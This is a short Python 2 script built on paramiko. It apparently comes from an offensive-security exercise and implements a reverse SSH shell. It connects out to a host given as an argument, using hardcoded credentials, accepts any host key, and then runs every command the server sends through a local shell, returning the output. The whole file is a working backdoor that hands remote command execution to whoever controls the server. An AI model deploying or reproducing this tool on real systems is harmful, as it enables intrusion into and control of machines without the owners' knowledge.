import threading
import paramiko
import subprocess
import sys

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()
	#client.load_host_keys('/home/florian/.ssh/known_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, username=user,password=passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command)
		print ssh_session.recv(1024)#read banner
		while True:
			command = ssh_session.recv(1024)#read command from server
			try:
				cmd_output = subprocess.check_output(command,shell=True)
				ssh_session.send(cmd_output)
			except Exception, e:
				ssh_session.send(str(e))
		client.close()
	return
ssh_command(str(sys.argv[1]),'justin','lovesthepython', 'ClientConnected')